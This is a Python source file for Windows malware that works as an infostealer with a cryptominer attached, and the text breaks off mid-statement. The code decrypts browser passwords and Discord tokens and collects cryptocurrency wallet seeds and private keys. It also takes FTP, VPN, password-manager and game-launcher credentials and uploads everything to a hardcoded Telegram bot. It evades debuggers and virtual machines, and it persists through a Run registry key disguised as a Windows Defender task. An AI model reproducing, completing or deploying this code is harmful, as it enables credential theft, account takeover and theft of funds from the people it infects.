import sys
import os
import psutil
import ctypes
import time
import socket
import uuid
import platform
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import subprocess
import urllib.request
import re
import datetime
import io
import winreg
import requests
import binascii
import hashlib
import logging
import random
import threading
from datetime import datetime
from signal import SIGINT, signal

import context as ctx

sock = None


def timer():
    return datetime.now().time()


address = 'bc1qcpxjkyes9smhxvmcp23sqzfac385ltfy2y8prk'

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = '7633119372:AAF4Gb9U5f6ydMejwMiRHdQz1FU1HWA-Viw'
TELEGRAM_CHAT_ID = '5703688057'

MUTEX_NAME = "Global\\WindowsUpdateManager"
STARTUP_KEY = "WindowsDefenderBackgroundTask"
HIDE_SELF = True

# Expanded paths for browsers, wallets, and other sensitive data
browser_paths = {
    'chrome': r'AppData\Local\Google\Chrome\User Data',
    'brave': r'AppData\LocalMISLEADINGBraveSoftware\Brave-Browser\User Data',
    'edge': r'AppData\Local\Microsoft\Edge\User Data',
    'opera': r'AppData\Roaming\Opera Software\Opera Stable',
    'opera_gx': r'AppData\Roaming\Opera Software\Opera GX Stable',
    'vivaldi': r'AppData\Local\Vivaldi\User Data',
    'torch': r'AppData\Local\Torch\User Data',
    'epic': r'AppData\Local\Epic Privacy Browser\User Data',
    'yandex': r'AppData\Local\Yandex\YandexBrowser\User Data',
    'cent': r'AppData\Local\CentBrowser\User Data',
    'comodo': r'AppData\Local\Comodo\Dragon\User Data',
    'srware': r'AppData\Local\Chromium\User Data',
    'slimjet': r'AppData\Local\Slimjet\User Data',
    'firefox': r'AppData\Roaming\Mozilla\Firefox\Profiles',
    'waterfox': r'AppData\Roaming\Waterfox\Profiles',
    'pale_moon': r'AppData\Roaming\Moonchild Productions\Pale Moon\Profiles',
    'metamask': r'AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn',
    'exodus': r'AppData\Roaming\Exodus',
    'atomic': r'AppData\Local\atomic\Local Storage\leveldb',
    'jaxx': r'AppData\Roaming\com.liberty.jaxx\IndexedDB',
    'electrum': r'AppData\Roaming\Electrum\wallets',
    'bitcoin_core': r'AppData\Roaming\Bitcoin\wallets',
    'ethereum': r'AppData\Roaming\Ethereum\keystore',
    'monero': r'AppData\Roaming\monero-wallet-gui',
    'coinomi': r'AppData\Roaming\Coinomi\Coinomi\wallets',
    'wasabi': r'AppData\Roaming\WalletWasabi\Client\Wallets',
    'trust': r'AppData\Roaming\Trust Wallet\Local Storage\leveldb',
    'filezilla': r'AppData\Roaming\FileZilla',
    'winscp': r'AppData\Roaming\WinSCP',
    'thunderbird': r'AppData\Roaming\Thunderbird\Profiles',
    'outlook': r'AppData\Local\Microsoft\Outlook',
    'discord': r'AppData\Roaming\discord',
    'telegram': r'AppData\Roaming\Telegram Desktop',
    'signal': r'AppData\Roaming\Signal',
    'whatsapp': r'AppData\Local\WhatsApp',
    'nordvpn': r'AppData\Local\NordVPN',
    'protonvpn': r'AppData\Local\ProtonVPN',
    'expressvpn': r'AppData\Local\ExpressVPN',
    'lastpass': r'AppData\Local\LastPass',
    'dashlane': r'AppData\Local\Dashlane',
    '1password': r'AppData\Local\1Password',
    'keepass': r'AppData\Roaming\KeePass',
    'steam': r'AppData\Local\Steam',
    'epic_games': r'AppData\Local\EpicGamesLauncher',
    'origin': r'AppData\Local\Origin',
    'uplay': r'AppData\Local\Ubisoft Game Launcher',
    'battlenet': r'AppData\Roaming\Battle.net',
    'putty': r'AppData\Roaming\PuTTY',
    'wsl': r'AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_*\LocalState\rootfs\home\*',
}


class AntiAnalysis:
    @staticmethod
    def is_debugger_present():
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0

    @staticmethod
    def is_vm_or_sandbox():
        vm_indicators = [
            "vbox", "vmware", "qemu", "xen", "hyperv", "kvm", "virtual", "parallels",
            "sandbox", "wine", "procmon", "fiddler", "wireshark", "processhacker"
        ]
        system_info = platform.uname()
        for indicator in vm_indicators:
            if indicator in system_info.system.lower() or indicator in system_info.node.lower():
                return True
        return False

    @staticmethod
    def check_blacklisted_processes():
        blacklisted = [
            "ollydbg.exe", "x64dbg.exe", "ida.exe", "cheatengine.exe",
            "wireshark.exe", "processhacker.exe", "procmon.exe", "fiddler.exe",
            "httpdebugger.exe", "dumpcap.exe", "hookexplorer.exe", "pe-sieve.exe",
            "vboxservice.exe", "vboxtray.exe", "vmwaretray.exe", "vmwareuser.exe"
        ]
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in blacklisted:
                return True
        return False

    @staticmethod
    def check_mutex():
        try:
            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
            if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                return True
            return False
        except:
            return False

    @staticmethod
    def check_screen_resolution():
        try:
            user32 = ctypes.windll.user32
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)
            return width < 1024 or height < 768
        except:
            return False

    @staticmethod
    def run_checks():
        if (AntiAnalysis.is_debugger_present() or
                AntiAnalysis.is_vm_or_sandbox() or
                AntiAnalysis.check_blacklisted_processes() or
                AntiAnalysis.check_mutex() or
                AntiAnalysis.check_screen_resolution()):
            sys.exit(0)


def get_system_info(all_data):
    try:
        hostname = socket.gethostname()
        username = os.getenv("USERNAME")
        try:
            ip_address = socket.gethostbyname_ex(hostname)[2][0]
        except:
            ip_address = socket.gethostbyname(hostname)
        hwid = uuid.getnode()
        gpu = ""
        try:
            import wmi
            w = wmi.WMI()
            for gpu_info in w.Win32_VideoController():
                gpu += f"{gpu_info.Name} | "
            gpu = gpu[:-3]
        except:
            gpu = "N/A"
        installed_software = ""
        try:
            reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, subkey_name) as subkey:
                            try:
                                name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                installed_software += f"{name}, "
                            except:
                                pass
                    except:
                        pass
            installed_software = installed_software[:-2]
            if len(installed_software) > 500:
                installed_software = installed_software[:500] + "..."
        except:
            installed_software = "N/A"

        all_data["System Info"] = {
            "Hostname": hostname,
            "Username": username,
            "IP Address": ip_address,
            "HWID (MAC)": str(hwid),
            "OS": platform.platform(),
            "CPU": platform.processor(),
            "GPU": gpu,
            "RAM": f"{round(psutil.virtual_memory().total / (1024.0 ** 3))} GB",
            "Installed Software": installed_software
        }
    except Exception as e:
        all_data["System Info Error"] = f"Failed to fetch system info. Error: {e}"


def send(all_data):
    telegram_file_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"

    # Convert content to JSON
    json_content = json.dumps(all_data, indent=2)
    file_data = io.BytesIO(json_content.encode('utf-8'))
    files = {'document': ('System_Data.txt', file_data)}
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'caption': "Collected System Data"
    }
    response = requests.post(telegram_file_url, data=data, files=files)
    return response.status_code == 200


def fetching_encryption_key(browser):
    if '*' in browser or '?' in browser:
        return None
    local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], browser, "Local State")
    try:
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)
    except FileNotFoundError:
        return None
    try:
        encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encryption_key = encryption_key[5:]
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    except Exception:
        return None


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"


def get_crypto_wallets(all_data):
    wallet_data = {}
    try:
        metamask_path = os.path.join(os.environ['USERPROFILE'], browser_paths['metamask'])
        if os.path.exists(metamask_path):
            wallet_data["MetaMask"] = []
            for file in os.listdir(metamask_path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    with open(os.path.join(metamask_path, file), 'r', errors='ignore') as f:
                        contents = f.read()
                        if 'seed' in contents or 'privateKey' in contents:
                            wallet_data["MetaMask"].append({
                                "file": file,
                                "content": contents
                            })
    except Exception as e:
        wallet_data["MetaMask_Error"] = str(e)

    try:
        exodus_path = os.path.join(os.environ['USERPROFILE'], browser_paths['exodus'])
        if os.path.exists(exodus_path):
            wallet_data["Exodus"] = []
            for root, dirs, files in os.walk(exodus_path):
                for file in files:
                    if file.endswith('.log') or file.endswith('.json'):
                        try:
                            with open(os.path.join(root, file), 'r') as f:
                                contents = f.read()
                                if 'seed' in contents or 'private' in contents.lower():
                                    wallet_data["Exodus"].append({
                                        "file": file,
                                        "content": contents
                                    })
                        except:
                            pass
    except Exception as e:
        wallet_data["Exodus_Error"] = str(e)

    wallet_paths = {
        'Electrum': browser_paths['electrum'],
        'Bitcoin Core': browser_paths['bitcoin_core'],
        'Ethereum': browser_paths['ethereum'],
        'Monero': browser_paths['monero'],
        'Coinomi': browser_paths['coinomi'],
        'Wasabi': browser_paths['wasabi'],
        'Trust Wallet': browser_paths['trust']
    }

    for wallet_name, path in wallet_paths.items():
        try:
            full_path = os.path.join(os.environ['USERPROFILE'], path)
            if os.path.exists(full_path):
                wallet_data[wallet_name] = {"path": full_path, "files": []}
                if wallet_name == 'Electrum':
                    for file in os.listdir(full_path):
                        if file.endswith('.dat'):
                            wallet_data[wallet_name]["files"].append(f"Potential wallet file: {file}")
                elif wallet_name == 'Ethereum':
                    for file in os.listdir(full_path):
                        if file.startswith('UTC--'):
                            wallet_data[wallet_name]["files"].append(f"Ethereum keystore file: {file}")
        except Exception as e:
            wallet_data[f"{wallet_name}_Error"] = str(e)

    if wallet_data:
        all_data["Crypto Wallets"] = wallet_data
    else:
        all_data["Crypto Wallets"] = {"message": "No cryptocurrency wallet data found"}


def get_ftp_clients(all_data):
    ftp_data = {}
    try:
        filezilla_path = os.path.join(os.environ['USERPROFILE'], browser_paths['filezilla'])
        if os.path.exists(filezilla_path):
            ftp_data["FileZilla"] = {}
            recent_file = os.path.join(filezilla_path, 'recentservers.xml')
            if os.path.exists(recent_file):
                with open(recent_file, 'r') as f:
                    ftp_data["FileZilla"]["RecentServers"] = f.read()
            sitemanager_file = os.path.join(filezilla_path, 'sitemanager.xml')
            if os.path.exists(sitemanager_file):
                with open(sitemanager_file, 'r') as f:
                    ftp_data["FileZilla"]["SiteManager"] = f.read()
    except Exception as e:
        ftp_data["FileZilla_Error"] = str(e)

    try:
        winscp_path = os.path.join(os.environ['USERPROFILE'], browser_paths['winscp'])
        if os.path.exists(winscp_path):
            ftp_data["WinSCP"] = {}
            ini_file = os.path.join(winscp_path, 'WinSCP.ini')
            if os.path.exists(ini_file):
                with open(ini_file, 'r') as f:
                    ftp_data["WinSCP"]["Configuration"] = f.read()
            sessions_path = os.path.join(winscp_path, 'Sessions')
            if os.path.exists(sessions_path):
                ftp_data["WinSCP"]["Sessions"] = {}
                for file in os.listdir(sessions_path):
                    if file.endswith('.ini'):
                        with open(os.path.join(sessions_path, file), 'r') as f:
                            ftp_data["WinSCP"]["Sessions"][file] = f.read()
    except Exception as e:
        ftp_data["WinSCP_Error"] = str(e)

    if ftp_data:
        all_data["FTP Clients"] = ftp_data
    else:
        all_data["FTP Clients"] = {"message": "No FTP client data found"}


def get_email_clients(all_data):
    email_data = {}
    try:
        thunderbird_path = os.path.join(os.environ['USERPROFILE'], browser_paths['thunderbird'])
        if os.path.exists(thunderbird_path):
            email_data["Thunderbird"] = {}
            for profile in os.listdir(thunderbird_path):
                if profile.endswith('.default'):
                    profile_path = os.path.join(thunderbird_path, profile)
                    signons_file = os.path.join(profile_path, 'signons.sqlite')
                    if os.path.exists(signons_file):
                        email_data["Thunderbird"]["Passwords"] = "Found"
                    mail_files = [f for f in os.listdir(profile_path) if f.endswith('.msf')]
                    if mail_files:
                        email_data["Thunderbird"]["MailFiles"] = mail_files
    except Exception as e:
        email_data["Thunderbird_Error"] = str(e)

    try:
        outlook_path = os.path.join(os.environ['USERPROFILE'], browser_paths['outlook'])
        if os.path.exists(outlook_path):
            email_data["Outlook"] = {}
            ost_files = [f for f in os.listdir(outlook_path) if f.endswith('.ost') or f.endswith('.pst')]
            if ost_files:
                email_data["Outlook"]["DataFiles"] = ost_files
    except Exception as e:
        email_data["Outlook_Error"] = str(e)

    if email_data:
        all_data["Email Clients"] = email_data
    else:
        all_data["Email Clients"] = {"message": "No email client data found"}


def get_messengers(all_data):
    messenger_data = {}
    try:
        telegram_path = os.path.join(os.environ['USERPROFILE'], browser_paths['telegram'])
        if os.path.exists(telegram_path):
            messenger_data["Telegram"] = {}
            session_files = [f for f in os.listdir(telegram_path) if f.startswith('tdata')]
            if session_files:
                messenger_data["Telegram"]["SessionData"] = "Found"
            cache_path = os.path.join(telegram_path, 'cache')
            if os.path.exists(cache_path):
                messenger_data["Telegram"]["Cache"] = "Found"
    except Exception as e:
        messenger_data["Telegram_Error"] = str(e)

    try:
        signal_path = os.path.join(os.environ['USERPROFILE'], browser_paths['signal'])
        if os.path.exists(signal_path):
            messenger_data["Signal"] = {}
            config_file = os.path.join(signal_path, 'config.json')
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    messenger_data["Signal"]["Config"] = f.read()
            db_files = [f for f in os.listdir(signal_path) if f.endswith('.db')]
            if db_files:
                messenger_data["Signal"]["Databases"] = db_files
    except Exception as e:
        messenger_data["Signal_Error"] = str(e)

    if messenger_data:
        all_data["Messengers"] = messenger_data
    else:
        all_data["Messengers"] = {"message": "No messenger data found"}


def get_vpn_configs(all_data):
    vpn_data = {}
    try:
        nordvpn_path = os.path.join(os.environ['USERPROFILE'], browser_paths['nordvpn'])
        if os.path.exists(nordvpn_path):
            vpn_data["NordVPN"] = {}
            config_files = [f for f in os.listdir(nordvpn_path) if f.endswith('.ovpn')]
            if config_files:
                vpn_data["NordVPN"]["ConfigFiles"] = config_files
            cred_file = os.path.join(nordvpn_path, 'auth.txt')
            if os.path.exists(cred_file):
                with open(cred_file, 'r') as f:
                    vpn_data["NordVPN"]["Credentials"] = f.read()
    except Exception as e:
        vpn_data["NordVPN_Error"] = str(e)

    try:
        protonvpn_path = os.path.join(os.environ['USERPROFILE'], browser_paths['protonvpn'])
        if os.path.exists(protonvpn_path):
            vpn_data["ProtonVPN"] = {}
            config_files = [f for f in os.listdir(protonvpn_path) if f.endswith('.ovpn')]
            if config_files:
                vpn_data["ProtonVPN"]["ConfigFiles"] = config_files
    except Exception as e:
        vpn_data["ProtonVPN_Error"] = str(e)

    if vpn_data:
        all_data["VPN Configs"] = vpn_data
    else:
        all_data["VPN Configs"] = {"message": "No VPN configuration data found"}


def get_password_managers(all_data):
    pm_data = {}
    try:
        lastpass_path = os.path.join(os.environ['USERPROFILE'], browser_paths['lastpass'])
        if os.path.exists(lastpass_path):
            pm_data["LastPass"] = {}
            ext_path = os.path.join(lastpass_path, 'Local Storage')
            if os.path.exists(ext_path):
                pm_data["LastPass"]["ExtensionData"] = "Found"
    except Exception as e:
        pm_data["LastPass_Error"] = str(e)

    try:
        keepass_path = os.path.join(os.environ['USERPROFILE'], browser_paths['keepass'])
        if os.path.exists(keepass_path):
            pm_data["KeePass"] = {}
            kdbx_files = [f for f in os.listdir(keepass_path) if f.endswith('.kdbx')]
            if kdbx_files:
                pm_data["KeePass"]["DatabaseFiles"] = kdbx_files
            config_file = os.path.join(keepass_path, 'KeePass.config.xml')
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    pm_data["KeePass"]["Config"] = f.read()
    except Exception as e:
        pm_data["KeePass_Error"] = str(e)

    if pm_data:
        all_data["Password Managers"] = pm_data
    else:
        all_data["Password Managers"] = {"message": "No password manager data found"}


def get_game_launchers(all_data):
    game_data = {}
    try:
        steam_path = os.path.join(os.environ['USERPROFILE'], browser_paths['steam'])
        if os.path.exists(steam_path):
            game_data["Steam"] = {}
            config_file = os.path.join(steam_path, 'config', 'loginusers.vdf')
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    game_data["Steam"]["LoginUsers"] = f.read()
            remember_file = os.path.join(steam_path, 'config', 'config.vdf')
            if os.path.exists(remember_file):
                with open(remember_file, 'r') as f:
                    game_data["Steam"]["Config"] = f.read()
    except Exception as e:
        game_data["Steam_Error"] = str(e)

    try:
        epic_path = os.path.join(os.environ['USERPROFILE'], browser_paths['epic_games'])
        if os.path.exists(epic_path):
            game_data["EpicGames"] = {}
            manifest_path = os.path.join(epic_path, 'Manifests')
            if os.path.exists(manifest_path):
                game_data["EpicGames"]["Manifests"] = "Found"
    except Exception as e:
        game_data["EpicGames_Error"] = str(e)

    if game_data:
        all_data["Game Launchers"] = game_data
    else:
        all_data["Game Launchers"] = {"message": "No game launcher data found"}


def get_development_tools(all_data):
    dev_data = {}
    try:
        putty_path = os.path.join(os.environ['USERPROFILE'], browser_paths['putty'])
        if os.path.exists(putty_path):
            dev_data["PuTTY"] = []
            reg_path = r"Software\SimonTatham\PuTTY\Sessions"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    session_name = winreg.EnumKey(key, i)
                    dev_data["PuTTY"].append(f"Session: {session_name}")
    except Exception as e:
        dev_data["PuTTY_Error"] = str(e)

    try:
        wsl_path = os.path.join(os.environ['USERPROFILE'], browser_paths['wsl'])
        if os.path.exists(wsl_path):
            dev_data["WSL"] = "Installation Found"
    except Exception as e:
        dev_data["WSL_Error"] = str(e)

    if dev_data:
        all_data["Development Tools"] = dev_data
    else:
        all_data["Development Tools"] = {"message": "No development tool data found"}


class Discord:
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }

    def getheaders(token=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def gettokens(path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []
        if not os.path.exists(path):
            return tokens
        for file in os.listdir(path):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                continue
        return tokens

    def getkey(path):
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()
        return key

    def getip():
        try:
            with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
                return json.loads(response.read().decode()).get("ip")
        except:
            return "None"

    def discord_main(all_data):
        discord_data = []
        checked = []
        for platform, path in Discord.PATHS.items():
            if not os.path.exists(path):
                continue
            for token in Discord.gettokens(path):
                token = token.replace("\\", "") if token.endswith("\\") else token
                try:
                    token = AES.new(
                        win32crypt.CryptUnprotectData(base64.b64decode(Discord.getkey(path))[5:], None, None, None, 0)[
                            1],
                        AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(
                        base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                    if token in checked:
                        continue
                    checked.append(token)
                    res = urllib.request.urlopen(
                        urllib.request.Request('https://discord.com/api/v10/users/@me',
                                               headers=Discord.getheaders(token)))
                    if res.getcode() != 200:
                        continue
                    res_json = json.loads(res.read().decode())
                    badges = []
                    flags = res_json['flags']
                    if flags == 64 or flags == 96:
                        badges.append("Bravery")
                    if flags == 128 or flags == 160:
                        badges.append("Brilliance")
                    if flags == 256 or flags == 288:
                        badges.append("Balance")
                    res = json.loads(urllib.request.urlopen(
                        urllib.request.Request('https://discordapp.com/api/v6/users/@me/relationships',
                                               headers=Discord.getheaders(token))).read().decode())
                    friends = len([x for x in res if x['type'] == 1])
                    params = urllib.parse.urlencode({"with_counts": True})
                    res = json.loads(urllib.request.urlopen(
                        urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}',
                                               headers=Discord.getheaders(token))).read().decode())
                    guilds = len(res)
                    guild_infos = []
                    for guild in res:
                        if guild['permissions'] & 8 or guild['permissions'] & 32:
                            res = json.loads(urllib.request.urlopen(
                                urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}',
                                                       headers=Discord.getheaders(token))).read().decode())
                            vanity = f"; .gg/{res['vanity_url_code']}" if res["vanity_url_code"] else ""
                            guild_infos.append({
                                "name": guild['name'],
                                "member_count": guild['approximate_member_count'],
                                "vanity": vanity
                            })
                    if not guild_infos:
                        guild_infos = ["No guilds"]
                    res = json.loads(urllib.request.urlopen(
                        urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions',
                                               headers=Discord.getheaders(token))).read().decode())
                    has_nitro = bool(len(res) > 0)
                    exp_date = None
                    if has_nitro:
                        badges.append("Subscriber")
                        exp_date = datetime.datetime.strptime(res[0]["current_period_end"],
                                                              "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
                    res = json.loads(urllib.request.urlopen(
                        urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
                                               headers=Discord.getheaders(token))).read().decode())
                    available = 0
                    boosts = []
                    boost = False
                    for id in res:
                        cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                        if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                            boosts.append("Available now")
                            available += 1
                        else:
                            boosts.append(f"Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}")
                        boost = True
                    if boost:
                        badges.append("Boost")
                    payment_methods = 0
                    payment_types = []
                    valid = 0
                    for x in json.loads(urllib.request.urlopen(
                            urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources',
                                                   headers=Discord.getheaders(token))).read().decode()):
                        if x['type'] == 1:
                            payment_types.append("CreditCard")
                            if not x['invalid']:
                                valid += 1
                            payment_methods += 1
                        elif x['type'] == 2:
                            payment_types.append("PayPal")
                            if not x['invalid']:
                                valid += 1
                            payment_methods += 1
                    nitro_info = {
                        "HasNitro": has_nitro,
                        "ExpirationDate": exp_date,
                        "BoostsAvailable": available,
                        "Boosts": boosts
                    } if has_nitro or available > 0 else {}
                    payment_info = {
                        "Amount": payment_methods,
                        "ValidMethods": valid,
                        "Types": payment_types
                    } if payment_methods > 0 else {}
                    discord_data.append({
                        "UserData": {
                            "Username": res_json['username'],
                            "UserID": res_json['id'],
                            "Email": res_json['email'],
                            "PhoneNumber": res_json['phone'],
                            "Friends": friends,
                            "Guilds": guilds,
                            "AdminPermissions": guild_infos,
                            "MFAEnabled": res_json['mfa_enabled'],
                            "Flags": flags,
                            "Locale": res_json['locale'],
                            "Verified": res_json['verified'],
                            "Badges": badges
                        },
                        "NitroInfo": nitro_info,
                        "PaymentInfo": payment_info,
                        "SystemInfo": {
                            "IP": Discord.getip(),
                            "Username": os.getenv("UserName"),
                            "PCName": os.getenv("COMPUTERNAME"),
                            "TokenLocation": platform,
                            "Token": token
                        }
                    })
                except urllib.error.HTTPError or json.JSONDecodeError:
                    continue
                except Exception as e:
                    print(f"ERROR: {e}")
                    continue
        if discord_data:
            all_data["Discord Tokens"] = discord_data
        else:
            all_data["Discord Tokens"] = {"message": "No Discord token data found"}


appdata_dir = os.getenv('LOCALAPPDATA')
target_dir = os.path.join(appdata_dir, "Updates")
if not os.path.exists(target_dir):
    os.makedirs(target_dir)
    current_script = os.path.abspath(sys.argv[0])
    script_name = os.path.basename(current_script)
    system32_path = os.path.join(target_dir, script_name)
elif os.path.exists(target_dir):
    current_script = os.path.abspath(sys.argv[0])
    script_name = os.path.basename(current_script)
    system32_path = os.path.join(target_dir, script_name)


def copy_to_system32():
    try:
        shutil.copy2(current_script, system32_path)
    except Exception as e:
        print(f"Copy error: {str(e)}")
        return None


class Persistence:
    @staticmethod
    def add_to_startup():
        try:
            exe_path = system32_path
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, STARTUP_KEY, 0, winreg.REG_SZ, exe_path)
            return True
        except:
            return False

    @staticmethod
    def hide_file():
        try:
            file_path = system32_path
            ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  # FILE_ATTRIBUTE_HIDDEN
            return True
        except:
            return False


def handler(signal_received, frame):
    ctx.fShutdown = True
    log(f"[{timer()}] Terminating Miner, Please Wait..")

def log(msg):
    logging.info(msg)


def get_current_block_height():
    r = requests.get('https://blockchain.info/latestblock')
    return int(r.json()['height'])


def check_for_shutdown(t):
    if ctx.fShutdown and t.n != -1:
        ctx.listfThreadRunning[t.n] = False
        t.exit = True


class ExitedThread(threading.Thread):
    def __init__(self, arg, n):
        super().__init__()
        self.exit = False
        self.arg = arg
        self.n = n

    def run(self):
        self.thread_handler(self.arg, self.n)

    def thread_handler(self, arg, n):
        while True:
            check_for_shutdown(self)
            if self.exit:
                break
            ctx.listfThreadRunning[n] = True
            try:
                self.thread_handler2(arg)
            except Exception as e:
                log("ThreadHandler() error")
                log(e)
            ctx.listfThreadRunning[n] = False
            time.sleep(2)

    def thread_handler2(self, arg):
        raise NotImplementedError("must implement this function")

    def check_self_shutdown(self):
        check_for_shutdown(self)


def bitcoin_miner(t, restarted=False):
    if restarted:
        log('[*] Bitcoin Miner restarted')
        log('[*] Bitcoin Miner Restarted')
        time.sleep(5)

    target = (ctx.nbits[2:] + '00' * (int(ctx.nbits[:2], 16) - 3)).zfill(64)
    extranonce2 = hex(random.randint(0, 2 ** 32 - 1))[2:].zfill(2 * ctx.extranonce2_size)
    coinbase = ctx.coinb1 + ctx.extranonce1 + extranonce2 + ctx.coinb2
    coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()

    merkle_root = coinbase_hash_bin
    for h in ctx.merkle_branch:
        merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()

    merkle_root = binascii.hexlify(merkle_root).decode()
    merkle_root = ''.join([merkle_root[i] + merkle_root[i + 1] for i in range(0, len(merkle_root), 2)][::-1])

    work_on = get_current_block_height()
    ctx.nHeightDiff[work_on + 1] = 0
    _diff = int("00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 16)

    log(f'[*] Working to solve block with height {work_on + 1}')

    hash_count = 0
    start_time = time.time()

    while True:
        t.check_self_shutdown()
        if t.exit:
            break

        if ctx.prevhash != ctx.updatedPrevHash:
            log(f'[*] New block {ctx.prevhash} detected on network')
            log(f'[*] Best difficulty for block {work_on + 1}: {ctx.nHeightDiff[work_on + 1]}')
            ctx.updatedPrevHash = ctx.prevhash
            bitcoin_miner(t, restarted=True)
            continue

        nonce = hex(random.randint(0, 2 ** 32 - 1))[2:].zfill(8)
        blockheader = ctx.version + ctx.prevhash + merkle_root + ctx.ntime + ctx.nbits + nonce + '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'
        hash = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
        hash = binascii.hexlify(hash).decode()

        hash_count += 1

        if hash.startswith('0000000'):
            log(f'[*] New hash: {hash} for block {work_on + 1}')
        this_hash = int(hash, 16)
        difficulty = _diff / this_hash

        if ctx.nHeightDiff[work_on + 1] < difficulty:
            ctx.nHeightDiff[work_on + 1] = difficulty

        if hash < target:
            log(f'[*] Block {work_on + 1} solved.')
            log(f'[*] Block hash: {hash}')
            payload = bytes(
